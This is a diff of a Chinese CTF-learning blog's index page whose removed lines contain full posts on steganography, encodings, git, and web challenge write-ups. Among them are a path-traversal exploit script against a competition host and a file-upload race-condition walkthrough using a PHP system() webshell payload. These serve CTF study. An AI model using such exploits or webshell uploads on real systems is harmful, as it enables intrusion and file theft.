-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">"LSB.bmp"</span>)</span><br><span class="line"></span><br><span class="line">pix = im.load()</span><br><span class="line"></span><br><span class="line">width, height = im.size</span><br><span class="line"></span><br><span class="line">extract_bits = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">        <span class="comment"># 每次取出一个像素点</span></span><br><span class="line">        r,g,b = pix[(x, y)]</span><br><span class="line">        extract_bits.append(r &amp; <span class="number">1</span>)</span><br><span class="line">        extract_bits.append(g &amp; <span class="number">1</span>)</span><br><span class="line">        extract_bits.append(b &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后每8位一组</span></span><br><span class="line"></span><br><span class="line">extract_byte_bits = [extract_bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(extract_bits), <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"extracted2.bmp"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> per_byte <span class="keyword">in</span> extract_byte_bits: </span><br><span class="line">        byte_str = <span class="string">''</span>.join(str(x) <span class="keyword">for</span> x <span class="keyword">in</span> per_byte)  <span class="comment"># 将list中的元素拼接起来</span></span><br><span class="line">        byteStr = chr(int(byte_str, <span class="number">2</span>))</span><br><span class="line">        f.write(bytes(byteStr, encoding=<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p>
-<p>这个是参考<a href="https://xz.aliyun.com/t/1844#toc-0" target="_blank" rel="noopener">先知某位师傅</a>后修改的，适用于python3</p>
-<p>可以帮助理解如何提取，从代码中可以看出，此处是先确定某一处高度，然后依次将宽度上的像素点提取出来，也就是StegSolver中的<code>Extracted by Row</code>,并且此处是按照该rgb的顺序来的</p>
-<p>大概思考了一下如果要把信息隐藏到图片中，这样应该可以:</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">"LSB.bmp"</span>)</span><br><span class="line"></span><br><span class="line">pix = im.load()</span><br><span class="line"></span><br><span class="line">width,height = im.size</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"flag&#123;Ilovyou&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取出flag中的每一位，编码成2进制的8位，3位3位的选出来</span></span><br><span class="line"><span class="comment"># 依次与r,g,b去与</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">insert_bits = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">	byte = bin(ord(flag[i]))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">	insert_bits.append(byte[x] <span class="keyword">for</span> x <span class="keyword">in</span> range(len(byte)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 化成3位一组</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">insert_bits_per_3 = [insert_bits[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(insert_bits), <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">		r,g,b = pix[(x,y)]</span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure></p>
-<p>但是我不知道怎么把数据写回图片。。。未完待续好了</p>
-<h2>实验吧一道题</h2>
-<p>这样一张bmp格式的图片</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/01.bmp" alt=""></p>
-<p>解法就是通过Windows的画图工具另存为png格式的，然后用StrgSolver浏览就行</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba9.png" alt=""></p>
-<h2>问鼎杯保密技能大赛</h2>
-<p>得到这样一张图片，
-![]https://raw.githubusercontent.com/xinyongpeng/gitpic/master/misc4.png</p>
-<p>首先需要修复png格式，其次需要修改宽度，但是需要考虑到crc32校验码</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">misc = open(<span class="string">"misc4.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># a = struct.pack('&gt;i', i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">	data = misc[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">'&gt;i'</span>,i)+ misc[<span class="number">20</span>:<span class="number">29</span>]</span><br><span class="line">	crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">	<span class="keyword">if</span> crc32 == <span class="number">0x932f8a6b</span>:</span><br><span class="line">		print(i)</span><br></pre></td></tr></table></figure></p>
-<p>第一个数据块总共就是13位长，<code>struct.pack('&gt;i',i)</code>依次尝试每一个宽度</p>
-<p>不过为啥要与<code>0xffffffff</code>进行与运算就很神奇</p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/#chunk" target="_blank" rel="noopener">参考PNG</a></p>
-<h2>参考</h2>
-<p><a href="https://segmentfault.com/a/1190000016223897" target="_blank" rel="noopener">Lsb图片隐写</a></p>
-<p><a href="https://github.com/RobinDavid/LSB-Steganography/blob/8c41e05e76cfa94ecc67d25a769aa81fbb3854ac/LSBSteg.py#L4" target="_blank" rel="noopener">github上一个LSB项目</a></p>
+          bugkuctf——猫片
 
-          
+一张猫的图片
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/19/MISC中的隐写/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1097,19 +1003,16 @@
       
         
           
-            <h2>社会主义核心价值观编码</h2>
-<p>https://sym233.github.io/core-values-encoder/</p>
-<p><img src="https://i.loli.net/2019/08/18/67Vqle8bG2k41oY.png" alt="quicker_e5eaccab-44b6-43e6-8833-d8326b71ec4f.png"></p>
-<h2>Quoted-Printable编码</h2>
-<p>http://www.mxcz.net/tools/quotedprintable.aspx</p>
-<p><img src="https://i.loli.net/2019/08/18/d3ZMLbBnrquagc9.png" alt="quicker_7217acfb-256f-4b44-94dc-97752364dbd8.png"></p>
-<h2>...</h2>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!...</span><br><span class="line">..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?.</span><br><span class="line">..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!!</span><br><span class="line">!!?.? !.?!! !!!!! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!! !!?.? !.?!!</span><br><span class="line">!!!!! !!!!! !!!!! !!!!! !.!!! !!!!! !!!!! .?... ..... ..... ..!?! !.?..</span><br><span class="line">..... ..... ..?.? !.?.. ..!.? ..... ..... ...!? !!.?! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!!! !!!!! !!!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... ..... ..... ...!. ..!.! !!!!. ?.... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !?.?! .?!!! !!!!. ..... ..... ..!.! !!.!! !.!!! .!!!! !!!.. .....</span><br><span class="line">..... ...!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... .....</span><br><span class="line">..... .!.?. ..... ..... ..!?! !.?!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!!!!</span><br><span class="line">!!!!! !!.!! !!!.! !!!!! !!!.? ..... ..!?! !.?.. ....? .?!.? ..... .!.?.</span><br><span class="line">..... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ..... ..... ....! .!!!.</span><br><span class="line">!!!!! !!.?. ..... ..... ....! ?!!.? !!!!! !!!!! !!!!? .?!.? !!!!! !!!!.</span><br><span class="line">..... ...!. ..... ..... ..!.! !!... ..!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... ..!.? ..... ..... ...!? !!.?! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!!! !!.!! !.?.. ..... ..... .!?!! .?... ..... ....? .?!.?</span><br><span class="line">..... ..... ..... .!.?. ..... ..... ..!?! !.?!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!!!! !!.!. ?.... ..... ..... .!?!! .?... ..... ..... .?.?!</span><br><span class="line">.?!.! !!!!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?. ...!. ?.</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/08/18/Y1HhDPtMxXqCbrT.png" alt="quicker_8ffb290e-f559-4bd7-ad39-2686d43018e2.png"></p>
-<h2>参考</h2>
-<p><a href="https://blog.csdn.net/pdsu161530247/article/details/74640746" target="_blank" rel="noopener">bugku ctf 一段base64 wirteup</a></p>
-
-          
+          社会主义核心价值观编码
+https://
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/18/MISC中神奇的编码/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1295,34 +1198,15 @@
       
         
           
-            <p>似乎好久之前就对这个有疑问了，还是沉下心来好好理解一下</p>
-<p>python3中的字符串都是Unicode编码的，我们知道编码是有很多种方式的，最常见的有utf-8,gbk,ascii编码</p>
-<p>好我们先来看：</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = 'example'  ---&gt; a 是 str类型</span><br><span class="line">b = a.encode('utf-8') ---&gt; 编码为字符</span><br></pre></td></tr></table></figure></p>
-<p>此时b的值为： <code>b'example'</code></p>
-<p>那这就很奇怪了，明明字母e德utf-8编码是0x65,为什么这里还是原来的？？</p>
-<p>不妨看这个：</p>
-<p><img src="https://i.loli.net/2019/08/18/2aqRykLTjgoCSGZ.png" alt="quicker_b9eba1c7-a187-429c-9fe8-00d4a77b6bc3.png"></p>
-<p>我们看到python默认会将这个解释成对应的字符，那这就很没办法了</p>
-<p>但是请看这个：</p>
-<p><img src="https://i.loli.net/2019/08/18/Tgfm8l1NxwvM4BL.png" alt="quicker_cb566cc5-d4b0-488f-8144-e6b8b706cb89.png"></p>
-<p>当我们去取出b中的一个元素时，这时候又转成了字母e的utf-8编码，只能说python在这一点上确实做的我无法理解</p>
-<p>ok到这里大概疑惑就没了，用什么格式编码得到的byte，就需要用对应的格式解码回去</p>
-<p><img src="https://i.loli.net/2019/08/18/giCLUX7GzTrQ6Vu.png" alt="quicker_c7be18fe-114e-4a98-80c8-b2c58a1c0eed.png"></p>
-<p>可以看出不同的编码得到的byte是不一样的，并且python默认会将可打印的字符直接打印出来？</p>
-<h2>问题</h2>
-<ol>
-<li>十六进制</li>
-</ol>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'example'</span></span><br><span class="line">b = <span class="string">b'example'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    res += str(hex(i))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure></p>
-<p>此时res的值为：<code>6578616d706c65</code></p>
-<p>如果要将其变回原来的字符串怎么办</p>
-<p>也就是一种ASCII hex编码</p>
-<p><img src="https://i.loli.net/2019/08/18/vbZe8PCkli6r2TE.png" alt="quicker_fc08be3e-6c48-4b4b-935e-517eddeb8344.png"></p>
-<p><code>bytes.fromhex(res)</code>这样就行了</p>
-<p><img src="https://i.loli.net/2019/08/18/LIZ69taKQqsVDi1.png" alt="quicker_25df3331-4429-45c5-a407-1fd39f4e8287.png"></p>
-
-          
+          似乎好久之前就对这个有疑问了，还是沉下心
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/18/python中的编码问题/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1508,26 +1392,15 @@
       
         
           
-            <p>跟队友打了一下这个比赛，小白学习了很多知识</p>
-<h2>show_me_your_image</h2>
-<p>这道题目很晕，上传文件之后可以查看，URL中的name似乎可以进行任意文件读取，但是base64解码之后得到的结果却是乱码，同时session可以用之前flask解码的脚本解码，但是这明明是php？？？(后来才知道是伪装成了php的flask)</p>
-<p>首先还是需要学习一下python中的<code>requests</code>包，如何使用requests包上传文件</p>
-<p>requests上传文件的简要代码如下：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:6789/upload"</span></span><br><span class="line">file = open(<span class="string">"1.jpg"</span>, <span class="string">'rb'</span>)</span><br><span class="line">files = &#123;<span class="string">'file'</span>: (<span class="string">'new_name.jpg'</span>, file, <span class="string">'image/pjpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line">file.close()</span><br><span class="line"><span class="keyword">print</span> response.status_code</span><br><span class="line"><span class="keyword">print</span> response.request.headers</span><br><span class="line"><span class="keyword">print</span> response.request.body</span><br></pre></td></tr></table></figure></p>
-<p><code>files</code>中包含了<code>file</code>对应的文件名，文件内容，和类型，有这三者就够了</p>
-<p>参考师傅们的exp</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_encode</span><span class="params">(target, filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(filename) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    r = requests.post(target+<span class="string">"upload.php"</span>,</span><br><span class="line">                      files=&#123;<span class="string">'file'</span>: (filename + <span class="string">'.jpg'</span>,</span><br><span class="line">                                      <span class="string">'z3r0test'</span>, <span class="string">'text/plain'</span>)&#125;</span><br><span class="line">                      )</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    pic_url = soup.find(<span class="string">'img'</span>)</span><br><span class="line">    <span class="comment"># print(pic_url['src'].replace('img.php?name=', ''))</span></span><br><span class="line">    filename = pic_url[<span class="string">'src'</span>].replace(<span class="string">'img.php?name='</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment"># print(filename)</span></span><br><span class="line">    urldecode = urllib.parse.unquote(filename)</span><br><span class="line">    <span class="keyword">return</span> urldecode[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(target, filename)</span>:</span></span><br><span class="line">    filename = urllib.parse.unquote(filename)</span><br><span class="line">    r = requests.get(target+<span class="string">"img.php"</span>,</span><br><span class="line">                     params=&#123;<span class="string">'name'</span>: filename&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    target = <span class="string">"http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/"</span></span><br><span class="line">    payload = <span class="string">"../.././proc/self/root/root/flag.txt"</span></span><br><span class="line">    <span class="comment"># payload = "../..//proc/self/cwd/app.py"</span></span><br><span class="line">    <span class="keyword">if</span> len(payload) % <span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"must be three times!"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    final = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(payload), <span class="number">3</span>):</span><br><span class="line">        final += base_encode(target, payload[i:i + <span class="number">3</span>])</span><br><span class="line">    final = urllib.parse.quote(final)</span><br><span class="line">    read(target, final)</span><br></pre></td></tr></table></figure></p>
-<p>两个trick：</p>
-<ol>
-<li>fuzz出文件名的编码关系，这里是三个变四个</li>
-<li>/proc/self/cwd/ 指向的是当前路径，在本题中用于拼凑3倍数长度的字符串</li>
-</ol>
-<p>其实我们只需要上传文件名然后获得对应的编码就行<code>r = requests.post(target+&quot;upload.php&quot;,files={'file': (filename + '.jpg', 'z3r0test', 'text/plain')})</code></p>
-<p>之后调用<code>BeautifulSoup</code>去解析就行了</p>
-<h2>参考</h2>
-<p><a href="http://www.zhangdongshengtech.com/article-detials/220" target="_blank" rel="noopener">使用requests 上传文件</a></p>
-
-          
+          跟队友打了一下这个比赛，小白学习了很多知
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/17/网络安全专项赛/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1624,8 +1497,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-17T10:37:34+08:00">
-                2019-08-17
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-19T18:39:00+08:00">
+                2019-08-19
               </time>
             
           </span>
@@ -1713,34 +1586,15 @@
       
         
           
-            <p>文件上传的题目遇到的不是很多，这里分析一下文件上传竞争</p>
-<p>上传竞争的来源：</p>
-<p>栗子：先存储文件，再判断是否合法，然后再删除。</p>
-<blockquote>
-<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”
-攻击：首先上传一个php文件
-当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
-</blockquote>
-<p>这里有一道对于文件上传竞争的wp：</p>
-<p><a href="https://blog.csdn.net/iamsongyu/article/details/83346029" target="_blank" rel="noopener">2018护网杯第一场 web easy tornado LTshop超详细解答</a></p>
-<p>同时我们来看一下moctf的一道题:</p>
-<p>http://119.23.73.3:5006/web2/index2.php</p>
-<p>直接访问index2.php肯定不正常，抓包修改成index.php，提示uploadsomething.php</p>
-<p>访问之后是一个文件上传页面。自定义文件名和文件内容</p>
-<p>文件名可以是php后缀的，那思路就是写一个shell进去再访问，但是访问时候页面提示太慢了。</p>
-<p>所以题目可能是检测到了php代码将其删除了，于是考虑文件上传竞争</p>
-<p>抓两个包，一个是文件上传的 <code>/web2/uploadsomething.php?filename=1.php&amp;content=%3C%3Fphp%2Bsystem%28%E2%80%9Cls%E2%80%9D%29%3B%3F%3E</code></p>
-<p>另一个是访问的 <code>/web2/uploads/56db0b8d99fd6116ed67d35b607cd9351ea94156/1.php</code></p>
-<p>都发送到intruder模块，设置线程为50，字典为空</p>
-<p>先爆破第一个：</p>
-<p><img src="/web2/uploads/56db0b8d99fd6116ed67d35b607cd9351ea94156/1.php" alt=""></p>
-<p>然后爆破第二个：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/upload1.png" alt=""></p>
-<p>就会有flag了</p>
-<h2>参考</h2>
-<p><a href="https://shuaizhupeiqi.github.io/2018/11/15/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">CTF中的条件竞争漏洞</a></p>
-
-          
+          文件上传的题目遇到的不是很多，这里分析一
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/17/上传竞争/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1926,50 +1780,15 @@
       
         
           
-            <p>最近发现自己还不是很懂git，于是好好学习一下</p>
-<h2>git标签管理</h2>
-<p>git有一个打标签的功能，这个功能可以理解成虚拟机的快照，</p>
-<blockquote>
-<p>Git的标签虽然是版本库的快照，但其实它就是指向某个commit的指针（跟分支很像对不对？但是分支可以移动，标签不能移动），所以，创建和删除标签都是瞬间完成的。  ---摘自廖雪峰</p>
-</blockquote>
-<ul>
-<li>
-<p>命令git tag &lt;tagname&gt;用于新建一个标签，默认为HEAD，也可以指定一个commit id；</p>
-</li>
-<li>
-<p>命令git tag -a &lt;tagname&gt; -m &quot;blablabla...&quot;可以指定标签信息；</p>
-</li>
-<li>
-<p>命令git tag可以查看所有标签。</p>
-</li>
-<li>
-<p>命令git push origin &lt;tagname&gt;可以推送一个本地标签；</p>
-</li>
-<li>
-<p>命令git push origin --tags可以推送全部未推送过的本地标签；</p>
-</li>
-<li>
-<p>命令git tag -d &lt;tagname&gt;可以删除一个本地标签；</p>
-</li>
-<li>
-<p>命令git push origin :refs/tags/&lt;tagname&gt;可以删除一个远程标签。</p>
-</li>
-</ul>
-<h2>GitHack的原理</h2>
-<p>如果将.git文件夹部署到线上环境，将引起git源码泄露</p>
-<p>工作原理：</p>
-<p>1、解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )
-2、去.git/objects/ 文件夹下下载对应的文件
-3、zlib解压文件，按原始的目录结构写入源代码</p>
-<h2>git的原理</h2>
-<p>git cat-file 命令</p>
-<p><img src="https://i.loli.net/2019/08/16/ALhQ2poTiesaFZz.png" alt="quicker_0ea21874-6cf7-487c-99a3-287a9376e979.png"></p>
-<h2>参考</h2>
-<p><a href="https://www.freebuf.com/sectool/66096.html" target="_blank" rel="noopener">GitHack：一个git泄露利用脚本</a>
-<a href="https://www.bbsmax.com/A/o75NM9mKJW/" target="_blank" rel="noopener">git内部原理</a>
-<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html" target="_blank" rel="noopener">XDCTF2015代码审计全解</a></p>
-
-          
+          最近发现自己还不是很懂git，于是好好学
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/16/复习git/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2155,73 +1974,16 @@
       
         
           
-            <h2>神盾局的秘密</h2>
-<p>查看页面源码，猜测是本地文件包含</p>
-<p>先查看<code>showimg.php</code></p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后查看index.php</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>再查看<code>shield.php</code></p>
